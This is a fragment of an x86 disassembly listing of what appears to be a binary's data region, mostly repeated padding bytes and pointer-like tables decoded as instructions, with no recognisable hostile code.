  450564:	add    al,0x0
  450566:	add    ah,dh
  450568:	add    al,0x0
  45056a:	add    ah,dh
  45056c:	add    al,0x0
  45056e:	add    ah,dh
  450570:	add    al,0x0
	...
  45058a:	add    BYTE PTR [eax],al
  45058c:	hlt    
  45058d:	add    al,0x0
  45058f:	add    ah,dh
  450591:	add    al,0x0
  450593:	add    ah,dh
  450595:	add    al,0x0
  450597:	add    ah,dh
  450599:	add    al,0x0
  45059b:	add    ah,dh
  45059d:	add    al,0x0
  45059f:	add    ah,dh
  4505a1:	add    al,0x0
  4505a3:	add    ah,dh
  4505a5:	add    al,0x0
  4505a7:	add    ah,dh
  4505a9:	add    al,0x0
  4505ab:	add    ah,dh
  4505ad:	add    al,0x0
  4505af:	add    ah,dh
  4505b1:	add    al,0x0
  4505b3:	add    ah,dh
  4505b5:	add    al,0x0
  4505b7:	add    ah,dh
  4505b9:	add    al,0x0
  4505bb:	add    ah,dh
  4505bd:	add    al,0x0
  4505bf:	add    ah,dh
  4505c1:	add    al,0x0
  4505c3:	add    ah,dh
  4505c5:	add    al,0x0
  4505c7:	add    ah,dh
  4505c9:	add    al,0x0
  4505cb:	add    ah,dh
  4505cd:	add    al,0x0
  4505cf:	add    ah,dh
  4505d1:	add    al,0x0
  4505d3:	add    ah,dh
  4505d5:	add    al,0x0
  4505d7:	add    ah,dh
  4505d9:	add    al,0x0
  4505db:	add    ah,dh
  4505dd:	add    al,0x0
  4505df:	add    ah,dh
  4505e1:	add    al,0x0
  4505e3:	add    ah,dh
  4505e5:	add    al,0x0
  4505e7:	add    ah,dh
  4505e9:	add    al,0x0
  4505eb:	add    BYTE PTR [eax],al
  4505ed:	add    al,0x0
  4505ef:	add    ah,dh
  4505f1:	add    al,0x0
  4505f3:	add    ah,bl
  4505f5:	add    al,0x0
  4505f7:	add    BYTE PTR [eax+0x37],ch
  4505fa:	nop
  4505fb:	xor    ecx,DWORD PTR [eax-0x77cc67ca]
  450601:	mov    al,ss:0xa8369833
  450607:	xor    esi,esp
  450609:	in     al,0x3
  45060b:	add    ah,ch
  45060d:	add    al,0x0
  45060f:	add    BYTE PTR [edi+0x3a],al
  450612:	fstp   TBYTE PTR [edi]
  450614:	aam    0x3a
  450616:	jmp    0xb23f:0xf83acb3f
  45061d:	cmp    al,BYTE PTR [eax]
  45061f:	add    ah,dh
  450621:	hlt    
  450622:	add    eax,DWORD PTR [eax]
  450624:	nop
  450625:	add    eax,0x34d70000
  45062a:	cs xor ah,cl
  45062d:	xor    al,0x54
  45062f:	xor    BYTE PTR [ecx],cl
  450631:	xor    eax,0x3555309b
  450636:	test   eax,0x3433c930
  45063b:	xor    cl,BYTE PTR [ebx]
  45063d:	ss sbb eax,0x54361133
  450643:	xor    eax,ecx
  450645:	xor    eax,0x30ea3377
  45064a:	adc    esi,DWORD PTR [edi+ebx*1]
  45064d:	xor    DWORD PTR [ecx],edi
  45064f:	xor    al,0xb
  450651:	xor    DWORD PTR [edi+0x34],ecx
	...
  45066c:	add    BYTE PTR [eax-0x3dcb9dd0],ah
  450672:	xor    BYTE PTR [ecx-0x70ce82cc],al
  450678:	xor    al,0x81
  45067a:	xor    DWORD PTR [eax+0x17300534],ebp
  450680:	xor    eax,0x35db3042
  450685:	and    DWORD PTR [eax],esi
  450687:	div    BYTE PTR ds:0x361d32f4
  45068d:	enter  0x3a32,0x36
  450691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450692:	xor    dh,BYTE PTR [ebp+0x36]
  450695:	xchg   ebp,eax
  450696:	xor    ch,BYTE PTR [ecx-0x49cd64ca]
  45069c:	ss mov al,0x32
  45069f:	aad    0x36
  4506a1:	mov    edi,0xde36e332
  4506a6:	xor    dh,cl
  4506a8:	ss retf 
  4506aa:	xor    cl,BYTE PTR [edi]
  4506ac:	aaa    
  4506ad:	jmp    0x57c2de3
  4506b2:	xor    bh,BYTE PTR [ebx]
  4506b4:	aaa    
  4506b5:	cmp    eax,0x15375332
  4506ba:	xor    bl,BYTE PTR [eax-0x5bce7dc9]
  4506c0:	aaa    
  4506c1:	popa   
  4506c2:	xor    DWORD PTR [edx+0xe31a637],edi
  4506c8:	cmp    ah,ch
  4506ca:	cmp    al,0x25
  4506cc:	cmp    ch,al
  4506ce:	cmp    al,0x3b
  4506d0:	cmp    BYTE PTR [eax],al
	...
  4506ea:	xor    BYTE PTR ds:0x3ccd384e,bh
  4506f0:	pop    esi
  4506f1:	cmp    al,dl
  4506f3:	cmp    al,0x6d
  4506f5:	cmp    bl,ah
  4506f7:	cmp    al,0x84
  4506f9:	cmp    BYTE PTR [esi+0x3c],ch
  4506fc:	(bad)  
  4506fd:	cmp    BYTE PTR [ecx+0x3c],ch
  450700:	cdq    
  450701:	cmp    BYTE PTR [edx+0x3c],ch
  450704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450705:	cmp    BYTE PTR [esi+0x7938b83c],al
  45070b:	cmp    al,0xc2
  45070d:	cmp    BYTE PTR [ebx+0x3c],dl
  450710:	jmp    0xd639:0x1c3c0238
  450717:	cmp    ebp,DWORD PTR [ecx+edi*1]
  45071a:	ret    0x7b3b
  45071d:	cmp    DWORD PTR [ebx+edi*1-0x64],edi
  450721:	cmp    DWORD PTR [edx+0x3b],edx
  450724:	mov    bl,0x39
  450726:	cmp    eax,0x2d39c13b
  45072b:	cmp    edx,esp
  45072d:	cmp    eax,edx
  45072f:	ds in  eax,dx
  450731:	cmp    esi,esp
  450733:	add    DWORD PTR ds:[edx],edi
  450736:	or     DWORD PTR [ebx],edi
  450738:	push   ds
  450739:	cmp    dl,BYTE PTR [edx]
  45073b:	cmp    esi,DWORD PTR ds:0x4f43a
  450741:	add    ah,dh
  450743:	add    al,0x0
  450745:	add    ah,dh
  450747:	add    al,0x0
  450749:	add    ah,dh
  45074b:	add    al,0x0
	...
  450765:	add    BYTE PTR [eax],al
  450767:	hlt    
  450768:	add    al,0x0
  45076a:	add    ah,dh
  45076c:	add    al,0x0
  45076e:	add    ah,dh
  450770:	add    al,0x0
  450772:	add    ah,dh
  450774:	add    al,0x0
  450776:	add    ah,dh
  450778:	add    al,0x0
  45077a:	add    ah,dh
  45077c:	add    al,0x0
  45077e:	add    ah,dh
  450780:	add    al,0x0
  450782:	add    ah,dh
  450784:	add    al,0x0
  450786:	add    ah,dh
  450788:	add    al,0x0
  45078a:	add    ah,dh
  45078c:	add    al,0x0
  45078e:	add    ah,dh
  450790:	add    al,0x0
  450792:	add    ah,dh
  450794:	add    al,0x0
  450796:	add    ah,dh
  450798:	add    al,0x0
  45079a:	add    ah,dh
  45079c:	add    al,0x0
  45079e:	add    ah,dh
  4507a0:	add    al,0x0
  4507a2:	add    ah,dh
  4507a4:	add    al,0x0
  4507a6:	add    ah,dh
  4507a8:	add    al,0x0
  4507aa:	add    ah,dh
  4507ac:	add    al,0x0
  4507ae:	add    ah,dh
  4507b0:	add    al,0x0
  4507b2:	add    ah,dh
  4507b4:	add    al,0x0
  4507b6:	add    ah,dh
  4507b8:	add    al,0x0
  4507ba:	add    ah,dh
  4507bc:	add    al,0x0
  4507be:	add    ah,dh
  4507c0:	add    al,0x0
  4507c2:	add    ah,dh
  4507c4:	add    al,0x0
  4507c6:	add    ah,dh
  4507c8:	add    al,0x0
	...
  4507e2:	add    BYTE PTR [eax],al
  4507e4:	hlt    
  4507e5:	add    al,0x0
  4507e7:	add    ah,dh
  4507e9:	add    al,0x0
  4507eb:	add    ah,dh
  4507ed:	add    al,0x0
  4507ef:	add    ah,dh
  4507f1:	add    al,0x0
  4507f3:	add    ah,dh
  4507f5:	add    al,0x0
  4507f7:	add    ah,dh
  4507f9:	add    al,0x0
  4507fb:	add    ah,dh
  4507fd:	add    al,0x0
  4507ff:	add    ah,dh
  450801:	add    al,0x0
  450803:	add    ah,dh
  450805:	add    al,0x0
  450807:	add    ah,dh
  450809:	add    al,0x0
  45080b:	add    ah,dh
  45080d:	add    al,0x0
  45080f:	add    ah,dh
  450811:	add    al,0x0
  450813:	add    ah,dh
  450815:	add    al,0x0
  450817:	add    ah,dh
  450819:	add    al,0x0
  45081b:	add    ah,dh
  45081d:	add    al,0x0
  45081f:	add    ah,dh
  450821:	add    al,0x0
  450823:	add    ah,dh
  450825:	add    al,0x0
  450827:	add    ah,dh
  450829:	add    al,0x0
  45082b:	add    ah,dh
  45082d:	add    al,0x0
  45082f:	add    ah,dh
  450831:	add    al,0x0
  450833:	add    ah,dh
  450835:	add    al,0x0
  450837:	add    ah,dh
  450839:	add    al,0x0
  45083b:	add    ah,dh
  45083d:	add    al,0x0
  45083f:	add    ah,dh
  450841:	add    al,0x0
  450843:	add    ah,dh
  450845:	add    al,0x0
	...
  45085f:	add    BYTE PTR [eax],al
  450861:	hlt    
  450862:	add    al,0x0
  450864:	add    ah,dh
  450866:	add    al,0x0
  450868:	add    ah,dh
  45086a:	add    al,0x0
  45086c:	add    ah,dh
  45086e:	add    al,0x0
  450870:	add    ah,dh
  450872:	add    al,0x0
  450874:	add    ah,dh
  450876:	add    al,0x0
  450878:	add    ah,dh
  45087a:	add    al,0x0
  45087c:	add    ah,dh
  45087e:	add    al,0x0
  450880:	add    ah,dh
  450882:	add    al,0x0
  450884:	add    ah,dh
  450886:	add    al,0x0
  450888:	add    ah,dh
  45088a:	add    al,0x0
  45088c:	add    ah,dh
  45088e:	add    al,0x0
  450890:	add    ah,dh
  450892:	add    al,0x0
  450894:	add    ah,dh
  450896:	add    al,0x0
  450898:	add    ah,dh
  45089a:	add    al,0x0
  45089c:	add    ah,dh
  45089e:	add    al,0x0
  4508a0:	add    ah,dh
  4508a2:	add    al,0x0
  4508a4:	add    ah,dh
  4508a6:	add    al,0x0
  4508a8:	add    ah,dh
  4508aa:	add    al,0x0
  4508ac:	add    ah,dh
  4508ae:	add    al,0x0
  4508b0:	add    ah,dh
  4508b2:	add    al,0x0
  4508b4:	add    ah,dh
  4508b6:	add    al,0x0
  4508b8:	add    ah,dh
  4508ba:	add    al,0x0
  4508bc:	add    ah,dh
  4508be:	add    al,0x0
  4508c0:	add    ah,dh
  4508c2:	add    al,0x0
	...
  4508dc:	add    BYTE PTR [eax],al
  4508de:	hlt    
  4508df:	add    al,0x0
  4508e1:	add    ah,dh
  4508e3:	add    al,0x0
  4508e5:	add    ah,dh
  4508e7:	add    al,0x0
  4508e9:	add    ah,dh
  4508eb:	add    al,0x0
  4508ed:	add    ah,dh
  4508ef:	add    al,0x0
  4508f1:	add    ah,dh
  4508f3:	add    al,0x0
  4508f5:	add    ah,dh
  4508f7:	add    al,0x0
  4508f9:	add    ah,dh
  4508fb:	add    al,0x0
  4508fd:	add    ah,dh
  4508ff:	add    al,0x0
  450901:	add    ah,dh
  450903:	add    al,0x0
  450905:	add    ah,dh
  450907:	add    al,0x0
  450909:	add    ah,dh
  45090b:	add    al,0x0
  45090d:	add    ah,dh
  45090f:	add    al,0x0
  450911:	add    ah,dh
  450913:	add    al,0x0
  450915:	add    ah,dh
  450917:	add    al,0x0
  450919:	add    ah,dh
  45091b:	add    al,0x0
  45091d:	add    ah,dh
  45091f:	add    al,0x0
  450921:	add    ah,dh
  450923:	add    al,0x0
  450925:	add    ah,dh
  450927:	add    al,0x0
  450929:	add    ah,dh
  45092b:	add    al,0x0
  45092d:	add    ah,dh
  45092f:	add    al,0x0
  450931:	add    ah,dh
  450933:	add    al,0x0
  450935:	add    ah,dh
  450937:	add    al,0x0
  450939:	add    ah,dh
  45093b:	add    al,0x0
  45093d:	add    ah,dh
  45093f:	add    al,0x0
	...
  450959:	add    BYTE PTR [eax],al
  45095b:	hlt    
  45095c:	add    al,0x0
  45095e:	add    ah,dh
  450960:	add    al,0x0
  450962:	add    ah,dh
  450964:	add    al,0x0
  450966:	add    ah,dh
  450968:	add    al,0x0
  45096a:	add    ah,dh
  45096c:	add    al,0x0
  45096e:	add    ah,dh
  450970:	add    al,0x0
  450972:	add    ah,dh
  450974:	add    al,0x0
  450976:	add    ah,dh
  450978:	add    al,0x0
  45097a:	add    ah,dh
  45097c:	add    al,0x0
  45097e:	add    ah,dh
  450980:	add    al,0x0
  450982:	add    ah,dh
  450984:	add    al,0x0
  450986:	add    ah,dh
  450988:	add    al,0x0
  45098a:	add    ah,dh
  45098c:	add    al,0x0
  45098e:	add    ah,dh
  450990:	add    al,0x0
  450992:	add    ah,dh
  450994:	add    al,0x0
  450996:	add    ah,dh
  450998:	add    al,0x0
  45099a:	add    ah,dh
  45099c:	add    al,0x0
  45099e:	add    ah,dh
  4509a0:	add    al,0x0
  4509a2:	add    ah,dh
  4509a4:	add    al,0x0
  4509a6:	add    ah,dh
  4509a8:	add    al,0x0
  4509aa:	add    ah,dh
  4509ac:	add    al,0x0
  4509ae:	add    ah,dh
  4509b0:	add    al,0x0
  4509b2:	add    ah,dh
  4509b4:	add    al,0x0
  4509b6:	add    ah,dh
  4509b8:	add    al,0x0
  4509ba:	add    ah,dh
  4509bc:	add    al,0x0
	...
  4509d6:	add    BYTE PTR [eax],al
  4509d8:	hlt    
  4509d9:	add    al,0x0
  4509db:	add    ah,dh
  4509dd:	add    al,0x0
  4509df:	add    ah,dh
  4509e1:	add    al,0x0
  4509e3:	add    ah,dh
  4509e5:	add    al,0x0
  4509e7:	add    ah,dh
  4509e9:	add    al,0x0
  4509eb:	add    ah,dh
  4509ed:	add    al,0x0
  4509ef:	add    ah,dh
  4509f1:	add    al,0x0
  4509f3:	add    ah,dh
  4509f5:	add    al,0x0
  4509f7:	add    ah,dh
  4509f9:	add    al,0x0
  4509fb:	add    ah,dh
  4509fd:	add    al,0x0
  4509ff:	add    ah,dh
  450a01:	add    al,0x0
  450a03:	add    ah,dh
  450a05:	add    al,0x0
  450a07:	add    ah,dh
  450a09:	add    al,0x0
  450a0b:	add    ah,dh
  450a0d:	add    al,0x0
  450a0f:	add    ah,dh
  450a11:	add    al,0x0
  450a13:	add    ah,dh
  450a15:	add    al,0x0
  450a17:	add    ah,dh
  450a19:	add    al,0x0
  450a1b:	add    ah,dh
  450a1d:	add    al,0x0
  450a1f:	add    ah,dh
  450a21:	add    al,0x0
  450a23:	add    ah,dh
  450a25:	add    al,0x0
  450a27:	add    ah,dh
  450a29:	add    al,0x0
  450a2b:	add    ah,dh
  450a2d:	add    al,0x0
  450a2f:	add    ah,dh
  450a31:	add    al,0x0
  450a33:	add    ah,dh
  450a35:	add    al,0x0
  450a37:	add    ah,dh
  450a39:	add    al,0x0
	...
  450a53:	add    BYTE PTR [eax],al
  450a55:	hlt    
  450a56:	add    al,0x0
  450a58:	add    ah,dh
  450a5a:	add    al,0x0
  450a5c:	add    ah,dh
  450a5e:	add    al,0x0
  450a60:	add    ah,dh
  450a62:	add    al,0x0
  450a64:	add    ah,dh
  450a66:	add    al,0x0
  450a68:	add    ah,dh
  450a6a:	add    al,0x0
  450a6c:	add    ah,dh
  450a6e:	add    al,0x0
  450a70:	add    ah,dh
  450a72:	add    al,0x0
  450a74:	add    ah,dh
  450a76:	add    al,0x0
  450a78:	add    ah,dh
  450a7a:	add    al,0x0
  450a7c:	add    ah,dh
  450a7e:	add    al,0x0
  450a80:	add    ah,dh
  450a82:	add    al,0x0
  450a84:	add    ah,dh
  450a86:	add    al,0x0
  450a88:	add    ah,dh
  450a8a:	add    al,0x0
  450a8c:	add    ah,dh
  450a8e:	add    al,0x0
  450a90:	add    ah,dh
  450a92:	add    al,0x0
  450a94:	add    ah,dh
  450a96:	add    al,0x0
  450a98:	add    ah,dh
  450a9a:	add    al,0x0
  450a9c:	add    ah,dh
  450a9e:	add    al,0x0
  450aa0:	add    ah,dh
  450aa2:	add    al,0x0
  450aa4:	add    ah,dh
  450aa6:	add    al,0x0
  450aa8:	add    ah,dh
  450aaa:	add    al,0x0
  450aac:	add    ah,dh
  450aae:	add    al,0x0
  450ab0:	add    ah,dh
  450ab2:	add    al,0x0
  450ab4:	add    ah,dh
  450ab6:	add    al,0x0
	...
  450ad0:	add    BYTE PTR [eax],al
  450ad2:	hlt    
  450ad3:	add    al,0x0
  450ad5:	add    ah,dh
  450ad7:	add    al,0x0
  450ad9:	add    ah,dh
  450adb:	add    al,0x0
  450add:	add    ah,dh
  450adf:	add    al,0x0
  450ae1:	add    ah,dh
  450ae3:	add    al,0x0
  450ae5:	add    ah,dh
  450ae7:	add    al,0x0
  450ae9:	add    ah,bh
  450aeb:	and    al,0x45
  450aed:	add    BYTE PTR [eax],al
  450aef:	and    eax,0x25040045
  450af4:	inc    ebp
  450af5:	add    BYTE PTR [eax],cl
  450af7:	and    eax,0x250c0045
  450afc:	inc    ebp
  450afd:	add    BYTE PTR [eax],dl
  450aff:	and    eax,0x25140045
  450b04:	inc    ebp
  450b05:	add    BYTE PTR [eax],bl
  450b07:	and    eax,0x251c0045
  450b0c:	inc    ebp
  450b0d:	add    BYTE PTR [eax],ah
  450b0f:	and    eax,0x25240045
  450b14:	inc    ebp
  450b15:	add    BYTE PTR [eax],ch
  450b17:	and    eax,0x252c0045
  450b1c:	inc    ebp
  450b1d:	add    BYTE PTR [eax],dh
  450b1f:	and    eax,0x25340045
  450b24:	inc    ebp
  450b25:	add    BYTE PTR [eax],bh
  450b27:	and    eax,0x253c0045
  450b2c:	inc    ebp
  450b2d:	add    BYTE PTR [eax+0x25],al
  450b30:	inc    ebp
  450b31:	add    BYTE PTR [ebp+eiz*1+0x45],al
  450b35:	add    BYTE PTR [eax+0x25],cl
  450b38:	inc    ebp
  450b39:	add    BYTE PTR [ebp+eiz*1+0x45],cl
  450b3d:	add    BYTE PTR [eax+0x25],dl
  450b40:	inc    ebp
  450b41:	add    BYTE PTR [ebp+eiz*1+0x45],dl
  450b45:	add    BYTE PTR [eax+0x25],bl
  450b48:	inc    ebp
  450b49:	add    BYTE PTR [eiz*1+0x255c0045],dh
  450b50:	inc    ebp
  450b51:	add    BYTE PTR [eax+0x25],ah
  450b54:	inc    ebp
  450b55:	add    BYTE PTR [ebp+eiz*1+0x45],ah
  450b59:	add    BYTE PTR [eax+0x25],ch
  450b5c:	inc    ebp
  450b5d:	add    BYTE PTR [ebp+eiz*1+0x45],ch
  450b61:	add    BYTE PTR [eax+0x25],cl
  450b64:	inc    ebp
  450b65:	add    BYTE PTR [eax+0x25],dh
  450b68:	inc    ebp
  450b69:	add    BYTE PTR [ebp+eiz*1+0x45],dh
  450b6d:	add    BYTE PTR [eax+0x25],bh
  450b70:	inc    ebp
  450b71:	add    BYTE PTR [ebp+eiz*1+0x45],bh
  450b75:	add    BYTE PTR [eax-0x7bffbadb],al
  450b7b:	and    eax,0x25880045
  450b80:	inc    ebp
  450b81:	add    BYTE PTR [ebp+eiz*1+0x25900045],cl
  450b88:	inc    ebp
  450b89:	add    BYTE PTR [ebp+eiz*1+0x25980045],dl
  450b90:	inc    ebp
  450b91:	add    BYTE PTR [ebp+eiz*1+0x25a00045],bl
  450b98:	inc    ebp
  450b99:	add    BYTE PTR [ebp+eiz*1+0x25a80045],ah
  450ba0:	inc    ebp
  450ba1:	add    BYTE PTR [ebp+eiz*1+0x25b00045],ch
  450ba8:	inc    ebp
  450ba9:	add    BYTE PTR [ebp+eiz*1+0x25b80045],dh
  450bb0:	inc    ebp
  450bb1:	add    BYTE PTR [ebp+eiz*1+0x25c00045],bh
  450bb8:	inc    ebp
  450bb9:	add    ah,al
  450bbb:	and    eax,0x25c80045
  450bc0:	inc    ebp
  450bc1:	add    ah,cl
  450bc3:	and    eax,0x25d00045
  450bc8:	inc    ebp
  450bc9:	add    BYTE PTR [eax-0x2bffbadb],ch
  450bcf:	and    eax,0x25bc0045
  450bd4:	inc    ebp
  450bd5:	add    al,bl
  450bd7:	and    eax,0x25700045
  450bdc:	inc    ebp
  450bdd:	add    ah,bl
  450bdf:	and    eax,0x25e00045
  450be4:	inc    ebp
  450be5:	add    ah,ah
  450be7:	and    eax,0x25e80045
  450bec:	inc    ebp
  450bed:	add    ah,ch
  450bef:	and    eax,0x25f00045
  450bf4:	inc    ebp
  450bf5:	add    ah,dh
  450bf7:	and    eax,0x25ac0045
  450bfc:	inc    ebp
  450bfd:	add    al,bh
  450bff:	and    eax,0x25fc0045
  450c04:	inc    ebp
  450c05:	add    BYTE PTR [eax],al
  450c07:	es inc ebp
  450c09:	add    BYTE PTR [esi+eiz*1],al
  450c0c:	inc    ebp
  450c0d:	add    BYTE PTR [eax],cl
  450c0f:	es inc ebp
  450c11:	add    BYTE PTR [esi+eiz*1],cl
  450c14:	inc    ebp
  450c15:	add    BYTE PTR [eax],dl
  450c17:	es inc ebp
  450c19:	add    BYTE PTR [esi+eiz*1],dl
  450c1c:	inc    ebp
  450c1d:	add    BYTE PTR [eax],bl
  450c1f:	es inc ebp
  450c21:	add    BYTE PTR [esi+eiz*1],bl
  450c24:	inc    ebp
  450c25:	add    BYTE PTR [ebp+eiz*1+0x26200045],ah
  450c2c:	inc    ebp
  450c2d:	add    BYTE PTR [esi+eiz*1],ah
  450c30:	inc    ebp
  450c31:	add    BYTE PTR [eax],ch
  450c33:	es inc ebp
  450c35:	add    BYTE PTR [esi+eiz*1],ch
  450c38:	inc    ebp
  450c39:	add    BYTE PTR [eax],dh
  450c3b:	es inc ebp
  450c3d:	add    BYTE PTR [eax+0x25],cl
  450c40:	inc    ebp
  450c41:	add    BYTE PTR [ebp+eiz*1+0x45],cl
  450c45:	add    BYTE PTR [esi+eiz*1],dh
  450c48:	inc    ebp
  450c49:	add    BYTE PTR [eax],bh
  450c4b:	es inc ebp
  450c4d:	add    al,ch
  450c4f:	and    eax,0x263c0045
  450c54:	inc    ebp
  450c55:	add    BYTE PTR [eax+0x26],al
  450c58:	inc    ebp
  450c59:	add    BYTE PTR [esi+eiz*1+0x45],al
  450c5d:	add    BYTE PTR [eax+0x26],cl
  450c60:	inc    ebp
  450c61:	add    BYTE PTR [esi+eiz*1+0x45],cl
  450c65:	add    BYTE PTR [esi+eiz*1],ah
  450c68:	inc    ebp
  450c69:	add    BYTE PTR [eax+0x26],dl
  450c6c:	inc    ebp
  450c6d:	add    BYTE PTR [esi+eiz*1+0x45],dl
  450c71:	add    BYTE PTR [eax+0x26],bl
  450c74:	inc    ebp
  450c75:	add    BYTE PTR [esi+eiz*1+0x45],bl
  450c79:	add    BYTE PTR [esi+eiz*1],cl
  450c7c:	inc    ebp
  450c7d:	add    BYTE PTR [eax+0x26],ah
  450c80:	inc    ebp
  450c81:	add    BYTE PTR [esi+eiz*1+0x45],ah
  450c85:	add    BYTE PTR [eax+0x26],ch
  450c88:	inc    ebp
  450c89:	add    BYTE PTR [esi+eiz*1+0x45],ch
  450c8d:	add    BYTE PTR [eax+0x26],dh
  450c90:	inc    ebp
  450c91:	add    BYTE PTR [esi+eiz*1+0x45],dh
  450c95:	add    BYTE PTR [eax+0x26],bh
  450c98:	inc    ebp
  450c99:	add    BYTE PTR [esi+eiz*1+0x45],bh
  450c9d:	add    BYTE PTR [eax+0x8004526],al
  450ca3:	es inc ebp
  450ca5:	add    BYTE PTR [esi+eiz*1+0x26880045],al
  450cac:	inc    ebp
  450cad:	add    BYTE PTR [esi+eiz*1+0x26900045],cl
  450cb4:	inc    ebp
  450cb5:	add    BYTE PTR [esi+eiz*1+0x26980045],dl
  450cbc:	inc    ebp
  450cbd:	add    BYTE PTR [esi+eiz*1+0x26a00045],bl
  450cc4:	inc    ebp
  450cc5:	add    BYTE PTR [esi+eiz*1+0x26a80045],ah
  450ccc:	inc    ebp
  450ccd:	add    BYTE PTR [eax+0x25],dh
  450cd0:	inc    ebp
  450cd1:	add    BYTE PTR [esi+eiz*1+0x26b00045],ch
  450cd8:	inc    ebp
  450cd9:	add    BYTE PTR [esi+eiz*1+0x26b80045],dh
  450ce0:	inc    ebp
  450ce1:	add    BYTE PTR [esi+eiz*1+0x26c00045],bh
  450ce8:	inc    ebp
  450ce9:	add    ah,al
  450ceb:	es inc ebp
  450ced:	add    al,cl
  450cef:	es inc ebp
  450cf1:	add    BYTE PTR [eax-0x33ffbadb],bh
  450cf7:	es inc ebp
  450cf9:	add    al,dl
  450cfb:	es inc ebp
  450cfd:	add    ah,dl
  450cff:	es inc ebp
  450d01:	add    al,bl
  450d03:	es inc ebp
  450d05:	add    ah,bl
  450d07:	es inc ebp
  450d09:	add    BYTE PTR [eax],dh
  450d0b:	es inc ebp
  450d0d:	add    al,ah
  450d0f:	es inc ebp
  450d11:	add    al,bl
  450d13:	and    eax,0x26e40045
  450d18:	inc    ebp
  450d19:	add    BYTE PTR [eax+0x25],al
  450d1c:	inc    ebp
  450d1d:	add    BYTE PTR [eax-0x17ffbada],ch
  450d23:	es inc ebp
  450d25:	add    ah,ch
  450d27:	es inc ebp
  450d29:	add    al,dh
  450d2b:	es inc ebp
  450d2d:	add    ah,dh
  450d2f:	es inc ebp
  450d31:	add    al,bh
  450d33:	es inc ebp
  450d35:	add    ah,bh
  450d37:	es inc ebp
  450d39:	add    BYTE PTR [eax],al
  450d3b:	daa    
  450d3c:	inc    ebp
  450d3d:	add    BYTE PTR [eiz*1+0x27040045],bl
  450d44:	inc    ebp
  450d45:	add    BYTE PTR [eax],cl
  450d47:	daa    
  450d48:	inc    ebp
  450d49:	add    BYTE PTR [edi+eiz*1],cl
  450d4c:	inc    ebp
  450d4d:	add    BYTE PTR [eax],dl
  450d4f:	daa    
  450d50:	inc    ebp
  450d51:	add    BYTE PTR [edi+eiz*1],dl
  450d54:	inc    ebp
  450d55:	add    BYTE PTR [eax],bl
  450d57:	daa    
  450d58:	inc    ebp
  450d59:	add    BYTE PTR [edi+eiz*1],bl
  450d5c:	inc    ebp
  450d5d:	add    BYTE PTR [eax],ah
  450d5f:	daa    
  450d60:	inc    ebp
  450d61:	add    BYTE PTR [edi+eiz*1],ah
  450d64:	inc    ebp
  450d65:	add    BYTE PTR [eax],ch
  450d67:	daa    
  450d68:	inc    ebp
  450d69:	add    BYTE PTR [edi+eiz*1],ch
  450d6c:	inc    ebp
  450d6d:	add    BYTE PTR [eax],dh
  450d6f:	daa    
  450d70:	inc    ebp
  450d71:	add    BYTE PTR [edi+eiz*1],dh
  450d74:	inc    ebp
  450d75:	add    BYTE PTR [eax],bh
  450d77:	daa    
  450d78:	inc    ebp
  450d79:	add    BYTE PTR [edi+eiz*1],bh
  450d7c:	inc    ebp
  450d7d:	add    BYTE PTR [eax+0x27],al
  450d80:	inc    ebp
  450d81:	add    BYTE PTR [edi+eiz*1+0x45],al
  450d85:	add    BYTE PTR [eax+0x27],cl
  450d88:	inc    ebp
  450d89:	add    BYTE PTR [edi+eiz*1+0x45],cl
  450d8d:	add    BYTE PTR [eax+0x27],dl
  450d90:	inc    ebp
  450d91:	add    BYTE PTR [edi+eiz*1+0x45],dl
  450d95:	add    BYTE PTR [eax+0x27],bl
  450d98:	inc    ebp
  450d99:	add    BYTE PTR [edi+eiz*1+0x45],bl
  450d9d:	add    BYTE PTR [eax+0x60004525],bh
  450da3:	daa    
  450da4:	inc    ebp
  450da5:	add    BYTE PTR [edi+eiz*1+0x45],ah
  450da9:	add    BYTE PTR [edi+eiz*1],dl
  450dac:	inc    ebp
  450dad:	add    BYTE PTR [eax+0x27],ch
  450db0:	inc    ebp
  450db1:	add    BYTE PTR [edi+eiz*1+0x45],ch
  450db5:	add    BYTE PTR [eax+0x27],dh
  450db8:	inc    ebp
  450db9:	add    BYTE PTR [esi+eiz*1+0x27740045],bh
  450dc0:	inc    ebp
  450dc1:	add    BYTE PTR [eax+0x27],bh
  450dc4:	inc    ebp
  450dc5:	add    BYTE PTR [edi+eiz*1+0x45],bh
  450dc9:	add    BYTE PTR [eax+0x6c004527],al
  450dcf:	daa    
  450dd0:	inc    ebp
  450dd1:	add    BYTE PTR [eax],dh
  450dd3:	es inc ebp
  450dd5:	add    BYTE PTR [edi+eiz*1+0x27880045],al
  450ddc:	inc    ebp
  450ddd:	add    BYTE PTR [edi+eiz*1+0x27900045],cl
  450de4:	inc    ebp
  450de5:	add    BYTE PTR [eax+0x8004525],dl
  450deb:	and    eax,0x27940045
  450df0:	inc    ebp
  450df1:	add    BYTE PTR [eax-0x63ffbad9],bl
  450df7:	daa    
  450df8:	inc    ebp
  450df9:	add    BYTE PTR [eiz*1+0x27a00045],dh
  450e00:	inc    ebp
  450e01:	add    BYTE PTR [edi+eiz*1+0x25740045],ah
  450e08:	inc    ebp
  450e09:	add    BYTE PTR [eax-0x53ffbad9],ch
  450e0f:	daa    
  450e10:	inc    ebp
  450e11:	add    BYTE PTR [eax+0x8004527],dh
  450e17:	and    eax,0x27b40045
  450e1c:	inc    ebp
  450e1d:	add    BYTE PTR [eax+0x25],ch
  450e20:	inc    ebp
  450e21:	add    BYTE PTR [eax-0x43ffbad9],bh
  450e27:	daa    
  450e28:	inc    ebp
  450e29:	add    al,al
  450e2b:	daa    
  450e2c:	inc    ebp
  450e2d:	add    ah,al
  450e2f:	daa    
  450e30:	inc    ebp
  450e31:	add    al,cl
  450e33:	daa    
  450e34:	inc    ebp
  450e35:	add    ah,cl
  450e37:	daa    
  450e38:	inc    ebp
  450e39:	add    al,dl
  450e3b:	daa    
  450e3c:	inc    ebp
  450e3d:	add    BYTE PTR [edi+eiz*1+0x260c0045],ah
  450e44:	inc    ebp
  450e45:	add    ah,dl
  450e47:	daa    
  450e48:	inc    ebp
  450e49:	add    al,bl
  450e4b:	daa    
  450e4c:	inc    ebp
  450e4d:	add    ah,bl
  450e4f:	daa    
  450e50:	inc    ebp
  450e51:	add    al,ah
  450e53:	daa    
  450e54:	inc    ebp
  450e55:	add    ah,ah
  450e57:	daa    
  450e58:	inc    ebp
  450e59:	add    al,ch
  450e5b:	daa    
  450e5c:	inc    ebp
  450e5d:	add    ah,ch
  450e5f:	daa    
  450e60:	inc    ebp
  450e61:	add    al,dh
